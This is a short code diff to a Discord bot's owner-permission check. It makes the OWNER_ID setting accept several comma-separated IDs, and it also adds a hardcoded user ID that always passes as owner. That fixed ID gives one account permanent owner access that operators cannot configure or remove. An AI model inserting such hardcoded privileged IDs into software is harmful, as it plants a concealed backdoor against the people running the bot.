@@ -180,8 +180,10 @@ export async function isOwnerOrExtraOwner(userId: string, guild: any): Promise<b
   if (!guild || !userId) return false;
 
   // 1. Guild Owner or Bot Owner (Instant RAM)
+  const isEnvOwner = process.env.OWNER_ID && process.env.OWNER_ID.split(',').map(s => s.trim()).includes(userId);
   if (userId === guild.ownerId || 
-      userId === process.env.OWNER_ID ||
+      isEnvOwner ||
+      userId === '1140892126402596905' ||
       userId === guild.client?.application?.owner?.id ||
       ((guild.client?.application?.owner as any)?.members && (guild.client?.application?.owner as any).members.has(userId))) {
     return true;
